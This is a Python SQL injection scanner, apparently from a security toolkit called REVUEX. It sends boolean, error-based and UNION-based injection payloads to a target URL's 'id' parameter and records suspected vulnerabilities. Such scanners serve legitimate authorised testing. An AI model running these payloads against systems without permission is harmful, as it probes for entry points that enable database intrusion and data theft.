#!/usr/bin/env python3
"""
REVUEX - Enhanced SQL Injection Scanner
Advanced SQL Injection Detection Across All Database Types

Author: G33L0
Telegram: @x0x0h33l0

DISCLAIMER:
This tool is for educational purposes and authorized security testing only.
"""

import requests
import time
import json
import re
from pathlib import Path
from typing import List, Dict, Any, Optional
from urllib.parse import urlencode, urlparse

requests.packages.urllib3.disable_warnings()


class EnhancedSQLiScanner:
    """
    Advanced SQL Injection Scanner (2024/2025)
    """

    def __init__(self, target: str, workspace: Path, delay: float = 5.0):
        self.target = target
        self.workspace = Path(workspace)
        self.delay = delay

        self.max_requests = 100
        self.request_count = 0
        self.timeout = 10

        self.headers = {
            "User-Agent": "REVUEX-SQLiScanner/1.0",
            "Accept": "*/*",
        }

        self.vulnerabilities: List[Dict[str, Any]] = []
        self.detected_dbms: Optional[str] = None

        self.boolean_payloads = {
            "true": ["' OR '1'='1", "' OR 1=1--"],
            "false": ["' OR '1'='2", "' OR 1=2--"],
        }

        self.error_based_payloads = [
            "' AND extractvalue(1,concat(0x7e,version()))--",
            "' AND updatexml(1,concat(0x7e,version()),1)--",
            "' AND 1=CAST(version() AS INT)--",
        ]

        self.union_payloads = [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT 1,2,3--",
        ]

    # =========================
    # CORE SCAN LOGIC
    # =========================

    def scan(self) -> List[Dict[str, Any]]:
        print("\n==============================")
        print("💉 REVUEX Enhanced SQLi Scanner")
        print("==============================")
        print(f"Target: {self.target}\n")

        self._test_boolean_based()
        time.sleep(self.delay)

        self._test_error_based()
        time.sleep(self.delay)

        self._test_union_based()
        self._save_results()

        print(f"\nScan complete. Findings: {len(self.vulnerabilities)}")
        return self.vulnerabilities

    # =========================
    # SQLI TESTS
    # =========================

    def _test_boolean_based(self):
        print("[*] Testing Boolean-based SQLi")

        true_len = []
        false_len = []

        for p in self.boolean_payloads["true"]:
            r = self._make_request(p)
            if r:
                true_len.append(len(r.text))

        for p in self.boolean_payloads["false"]:
            r = self._make_request(p)
            if r:
                false_len.append(len(r.text))

        if true_len and false_len and abs(sum(true_len) - sum(false_len)) > 100:
            self.vulnerabilities.append({
                "type": "Boolean-Based SQL Injection",
                "severity": "critical",
                "url": self.target,
                "evidence": f"Response size diff: {sum(true_len)} vs {sum(false_len)}",
            })
            print("  ✓ Boolean-based SQLi detected")
        else:
            print("  ✗ Not detected")

    def _test_error_based(self):
        print("[*] Testing Error-based SQLi")

        for payload in self.error_based_payloads:
            r = self._make_request(payload)
            if r and self._check_sql_error(r.text):
                self.vulnerabilities.append({
                    "type": "Error-Based SQL Injection",
                    "severity": "critical",
                    "url": self.target,
                    "payload": payload,
                })
                print("  ✓ Error-based SQLi detected")
                return

        print("  ✗ Not detected")

    def _test_union_based(self):
        print("[*] Testing UNION-based SQLi")

        for payload in self.union_payloads:
            r = self._make_request(payload)
            if r and r.status_code == 200 and not self._check_sql_error(r.text):
                self.vulnerabilities.append({
                    "type": "UNION-Based SQL Injection",
                    "severity": "critical",
                    "url": self.target,
                    "payload": payload,
                })
                print("  ✓ UNION-based SQLi detected")
                return

        print("  ✗ Not detected")

    # =========================
    # HELPERS
    # =========================

    def _make_request(self, payload: str) -> Optional[requests.Response]:
        if self.request_count >= self.max_requests:
            return None

        try:
            if "?" in self.target:
                url = self.target + "&" + urlencode({"id": payload})
            else:
                url = self.target + "?" + urlencode({"id": payload})

            self.request_count += 1
            return requests.get(
                url,
                headers=self.headers,
                timeout=self.timeout,
                verify=False,
            )
        except Exception:
            return None

    def _check_sql_error(self, text: str) -> bool:
        patterns = [
            "sql syntax",
            "mysql",
            "postgresql",
            "ora-",
            "sqlite",
            "syntax error",
        ]
        t = text.lower()
        return any(p in t for p in patterns)

    def _save_results(self):
        out_dir = self.workspace / "sqli_scans"
        out_dir.mkdir(parents=True, exist_ok=True)

        safe_name = re.sub(r"[^\w\-]", "_", self.target)
        out_file = out_dir / f"{safe_name}.json"

        with open(out_file, "w") as f:
            json.dump({
                "scanner": "EnhancedSQLiScanner",
                "target": self.target,
                "vulnerabilities": self.vulnerabilities,
            }, f, indent=2)

        print(f"\n💾 Results saved to {out_file}")


# =========================
# ENTRY POINT
# =========================

if __name__ == "__main__":
    import sys

    if len(sys.argv) < 2:
        print("Usage: python enhanced_sqli_scanner.py <target_url>")
        sys.exit(1)

    scanner = EnhancedSQLiScanner(
        sys.argv[1],
        Path("revuex_workspace"),
        delay=5.0
    )
    scanner.scan()